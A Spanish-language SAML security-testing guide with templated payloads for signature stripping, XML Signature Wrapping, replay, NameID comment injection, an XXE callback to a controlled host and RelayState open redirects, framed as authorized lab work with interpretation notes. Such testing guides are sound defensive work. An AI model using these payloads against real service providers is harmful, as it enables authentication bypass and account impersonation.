# 🗡️ Fallos de validación SAML: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 📚 Banco ampliado de payloads

[Abrir el catálogo por técnica y los diccionarios de PayloadsAllTheThings](Catalogo_PATT.md). Los bloques de esta guía explican las pruebas iniciales; el catálogo reúne variantes adicionales por motor, parser y contexto.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Campos de destinatario y audiencia

```xml
Destination="{ACS_ESPERADO}"
Destination="{ACS_ALTERNO}"
<Audience>{SP_ENTITY_ID_ESPERADO}</Audience>
<Audience>{SP_ENTITY_ID_DISTINTO}</Audience>
SubjectConfirmationData Recipient="{ACS_ESPERADO}"
SubjectConfirmationData Recipient="{ACS_DISTINTO}"
```

**Cuándo usarlo:** Fragmentos para modificar una respuesta SAML emitida para una cuenta de laboratorio. Sin una firma válida, el rechazo solo prueba integridad; para audiencia/destinatario usa IdP propio.

**Fuente:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html).


### Vigencia y correlación

```xml
InResponseTo="{REQUEST_ID_ACTUAL}"
InResponseTo="{REQUEST_ID_ANTERIOR_PROPIO}"
NotBefore="{INSTANTE_FUTURO}"
NotOnOrAfter="{INSTANTE_EXPIRADO}"
<OneTimeUse/>
```

**Cuándo usarlo:** Usar aserciones y solicitudes propias. La aceptación de una respuesta vencida, futura o no solicitada requiere verificar el contexto del flujo y el reloj del SP.

**Fuente:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html).


## 🧭 Payloads por contexto

### Nombre de sujeto y atributos de rol

```xml
<NameID>{USUARIO_A_PROPIO}</NameID>
<NameID>{USUARIO_B_PROPIO}</NameID>
<Attribute Name="email"><AttributeValue>{EMAIL_A_PROPIO}</AttributeValue></Attribute>
<Attribute Name="groups"><AttributeValue>{GRUPO_DE_PRUEBA}</AttributeValue></Attribute>
```

**Cuándo usarlo:** Cambiar atributos rompe la firma normal; para comprobar mapeos y privilegios emite aserciones válidas desde un IdP de prueba. No concluir bypass por solo editar XML local.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SAML%20Injection/README.md).


### RelayState y destino posterior

```text
RelayState=%2Fperfil
RelayState=%2Fcuenta
RelayState=https%3A%2F%2F{DOMINIO_CONTROLADO}%2Fretorno
RelayState=%2F%2F{DOMINIO_CONTROLADO}%2Fretorno
```

**Cuándo usarlo:** Prueba una variante por flujo propio. RelayState puede causar redirección, pero no confirma alteración de identidad SAML; verifica si se filtran códigos o información sensible.

**Fuente:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html).


## 🔥 Payloads avanzados

### Firma y nodo consumido

```xml
<Response ID="{ID_RESPUESTA}"><Assertion ID="{ID_FIRMADO}">...</Assertion></Response>
<Response ID="{ID_RESPUESTA}"><Assertion ID="{ID_NO_FIRMADO}">...</Assertion><Assertion ID="{ID_FIRMADO}">...</Assertion></Response>
<Response ID="{ID_RESPUESTA}"><Assertion ID="{ID_FIRMADO}">...</Assertion><Assertion ID="{ID_NO_FIRMADO}">...</Assertion></Response>
<Reference URI="#{ID_FIRMADO}"/>
```

**Cuándo usarlo:** Esquema para laboratorio de XML Signature Wrapping; los puntos suspensivos representan una aserción SAML válida de prueba, no un payload funcional. La evidencia exige que el SP use la aserción distinta de la firmada.

**Fuente:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html).


## 🔬 Pruebas guiadas por escenario

### 1. Firma alterada

**Objetivo:** Cambiar un NameID de una respuesta SAML propia sin rehacer XML Signature.

```xml
<saml:NameID>{EMAIL_PROPIO_MODIFICADO}</saml:NameID>
```

**Interpretación:** La respuesta debe rechazarse. Hacer el cambio dentro de una SAMLResponse válida propia y comparar con original.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SAML%20Injection/README.md).

### 2. Signature stripping

**Objetivo:** Quitar Signature de una respuesta propia y verificar que el SP la rechace.

```xml
<samlp:Response ID="{RESPONSE_ID_PROPIO}" Destination="{ACS_PROPIA}">
  <saml:Assertion ID="{ASSERTION_ID_PROPIO}">
    <saml:Subject><saml:NameID>{EMAIL_PROPIO}</saml:NameID></saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

**Interpretación:** Es un esquema de laboratorio: conservar Issuer, Audience, Conditions y demás campos requeridos del mensaje real.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SAML%20Injection/README.md).

### 3. Wrapping de assertion

**Objetivo:** En laboratorio, duplicar la assertion: una firmada propia y otra no firmada con otra identidad controlada.

```xml
<samlp:Response>
  <saml:Assertion ID="{ID_FORJADA}">
    <saml:Subject><saml:NameID>{EMAIL_CUENTA_B_PROPIA}</saml:NameID></saml:Subject>
  </saml:Assertion>
  <saml:Assertion ID="{ID_FIRMADA}">
    <ds:Signature><ds:SignedInfo><ds:Reference URI="#{ID_FIRMADA}"/></ds:SignedInfo></ds:Signature>
    <saml:Subject><saml:NameID>{EMAIL_CUENTA_A_PROPIA}</saml:NameID></saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

**Interpretación:** El bloque muestra la disposición XSW, no una firma válida completa. Partir de respuesta real y verificar qué assertion se consume.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SAML%20Injection/README.md).

### 4. Replay de respuesta

**Objetivo:** Reenviar una SAMLResponse ya consumida por la misma cuenta propia.

```http
POST /saml/acs HTTP/1.1
Host: {SP_EN_ALCANCE}
Content-Type: application/x-www-form-urlencoded

SAMLResponse={RESPUESTA_PROPIA_YA_USADA}&RelayState={RELAY_PROPIO}
```

**Interpretación:** Comprobar si InResponseTo y el ID ya consumido impiden crear nueva sesión; no inferir bypass por una redirección.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SAML%20Injection/README.md).

### 5. Audience y Destination

**Objetivo:** Alterar un campo por vez en una respuesta propia firmada por un IdP de laboratorio.

```xml
<saml:Audience>{SP_NO_DESTINATARIO_DE_LAB}</saml:Audience>
<samlp:Response Destination="{ACS_NO_REGISTRADA_DE_LAB}">...</samlp:Response>
```

**Interpretación:** Si se modifica una respuesta ya firmada, el rechazo puede deberse a firma inválida; generar una nueva firma de lab para aislar el control.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SAML%20Injection/README.md).

### 6. Comentario XML en NameID

**Objetivo:** Evaluar diferencias de parser en un IdP/SP de laboratorio con dos cuentas propias.

```xml
<saml:NameID>usuario<!--prueba-->@{DOMINIO_DE_LAB}</saml:NameID>
```

**Interpretación:** La técnica depende de normalización de texto XML y biblioteca. Confirmar identidad de la sesión creada, no solo texto reflejado.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SAML%20Injection/README.md).

### 7. Entidad XML externa en parser SAML

**Objetivo:** Verificar si una entidad provoca callback a un dominio de prueba, sin solicitar archivos.

```xml
<!DOCTYPE r [<!ENTITY prueba SYSTEM "https://{CONTROLLED_HOST}/saml-canary">]>
<samlp:Response>...&prueba;...</samlp:Response>
```

**Interpretación:** Muchos parsers rechazan DTD antes de verificar SAML. Una callback prueba XXE, no suplantación de identidad.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SAML%20Injection/README.md).

### 8. InResponseTo de otra solicitud

**Objetivo:** En SP e IdP de laboratorio, ligar una respuesta firmada a un AuthnRequest distinto.

```xml
<samlp:Response InResponseTo="{AUTHN_REQUEST_A}" Destination="{ACS_PROPIA}">
  <saml:Assertion ID="{ASSERTION_FIRMADA_B}">...</saml:Assertion>
</samlp:Response>
```

**Interpretación:** Generar y firmar la respuesta con IdP propio; alterar XML ya firmado solo prueba rechazo criptográfico.

**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html).

### 9. Condiciones temporales

**Objetivo:** Emitir en laboratorio una assertion propia firmada con NotOnOrAfter anterior al momento actual.

```xml
<saml:Conditions NotBefore="{FECHA_PASADA}" NotOnOrAfter="{FECHA_YA_VENCIDA}">
  <saml:AudienceRestriction><saml:Audience>{ENTITY_ID_SP}</saml:Audience></saml:AudienceRestriction>
</saml:Conditions>
```

**Interpretación:** El SP debe rechazar la assertion vencida; conservar firma válida y comparar contra una ventana vigente.

**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html).

### 10. RelayState como redirección

**Objetivo:** Con respuesta válida propia, cambiar solo RelayState por una URL controlada.

```http
POST /saml/acs HTTP/1.1
Host: {SP_EN_ALCANCE}
Content-Type: application/x-www-form-urlencoded

SAMLResponse={RESPUESTA_PROPIA_VALIDA}&RelayState=https%3A%2F%2F{CONTROLLED_HOST}%2Freturn
```

**Interpretación:** Si el SP redirige fuera de su lista permitida, reportar open redirect en flujo SAML; no implica por sí solo bypass de firma.

**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html).

### 11. Recipient en SubjectConfirmationData

**Objetivo:** Emitir en IdP de laboratorio una assertion firmada cuyo Recipient apunta a otro ACS propio.

```xml
<saml:SubjectConfirmationData Recipient="{ACS_B_DE_LAB}" InResponseTo="{AUTHN_REQUEST_A}" NotOnOrAfter="{FECHA_VIGENTE}"/>
```

**Interpretación:** El SP A debe rechazarla aunque Destination exterior sea correcto; firmar de nuevo y variar solo Recipient.

**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html).

### 12. KeyInfo con certificado aportado

**Objetivo:** En SP de laboratorio, adjuntar certificado autofirmado propio dentro de la firma XML.

```xml
<ds:KeyInfo><ds:X509Data><ds:X509Certificate>{CERT_DER_BASE64_PROPIO}</ds:X509Certificate></ds:X509Data></ds:KeyInfo>
```

**Interpretación:** Una firma matemáticamente válida no convierte ese certificado en IdP confiable; comprobar rechazo por trust store.

**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html).

### 13. Respuesta IdP initiated no solicitada

**Objetivo:** Si el SP declara deshabilitado IdP initiated SSO, enviar una respuesta propia firmada sin InResponseTo.

```http
POST /saml/acs HTTP/1.1
Host: {SP_EN_ALCANCE}
Content-Type: application/x-www-form-urlencoded

SAMLResponse={RESPUESTA_IDP_INIT_PROPIA}&RelayState={RELAY_PROPIO}
```

**Interpretación:** La aceptación solo es fallo si contradice la política; cuando está habilitado, revisar replay, intención de login y destino.

**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html).

### 14. Firma XML con SHA-1

**Objetivo:** En laboratorio compatible, emitir una respuesta propia firmada con rsa-sha1 y observar la política del SP.

```xml
<ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
```

**Interpretación:** Editar solo el atributo invalida la firma; la prueba exige que el IdP de laboratorio firme realmente con SHA-1.

**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
